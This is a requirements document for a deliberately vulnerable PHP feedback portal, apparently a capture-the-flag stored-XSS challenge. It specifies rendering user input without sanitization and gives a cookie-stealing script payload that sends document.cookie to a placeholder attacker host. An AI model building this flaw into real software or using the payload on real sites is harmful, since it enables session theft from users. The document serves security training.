# Product Requirement Document (PRD) - Modern Corporate Guestbook & Feedback Portal

## 1. Overview & UI/UX Goal
Create a clean, modern, and production-ready Corporate Guestbook and Client Feedback Portal. The design should look like a professional B2B SaaS application or a premium company portal where clients leave testimonials.

- **Design System:** Tailwind CSS using a professional Indigo/Violet or Emerald tech palette. Clean layout, sharp cards, and smooth micro-interactions.
- **Tech Stack:** Simple PHP backend with an elegant HTML/Tailwind frontend, completely self-contained in a single index file (`index.php`) for easy deployment in `/var/www/html/`.

---

## 2. Target Features & Layout (Stored XSS Simulation)

### Feature A: Testimonial & Feedback Feed
A beautiful feed section that displays all messages left by visitors. Each feedback card should show:
- Client Name
- Company Name
- Feedback Message Rating (Stars)

### Feature B: "Leave a Feedback" Form
A polished form where users can submit their names, company, and message.
- **The Vulnerability (Stored XSS):** The PHP backend must save the submitted form data directly into a local file (e.g., `feedbacks.json` or a simple SQLite/MySQL database). 
- **The Core Flaw:** When rendering the saved messages onto the feed section, the PHP backend must output the raw text **WITHOUT** using `htmlspecialchars()` or any sanitization. This allows any injected HTML/JavaScript tags to execute in the browser of anyone who visits the page.

---

## 3. Flag Placement Strategy
Since this is an XSS challenge, the Flag will be simulated as an **Admin Cookie** or a **Secret Notification** that can only be stolen or viewed if a script executes successfully.

- **Implementation Option 1 (Cookie Stealing):** In the PHP code, set a mock cookie named `Privileged_Flag` with the value `POLINES{XSS_ST0R3D_S3CR3T_XX}`. When the peer attacker injects `<script>fetch('http://attacker-ip/?cookie=' + document.cookie)</script>`, they can steal it.
- **Implementation Option 2 (Hidden Admin Area):** An element or a persistent banner on the page that only renders if the script triggers a specific action, displaying: `FLAG: POLINES{XSS_M4L1C10US_CODF_XX}`.

---

## 4. UI Layout Specifications for `index.php`
- **Hero Section:** A sleek header stating "Enterprise Client Relations - Public Feedback Portal".
- **Two-Column Layout:**
  - *Left Column:* The submission form inside a clean, bordered white card with floating labels.
  - *Right Column:* A scrollable timeline/feed of active testimonials with nice avatars and professional formatting.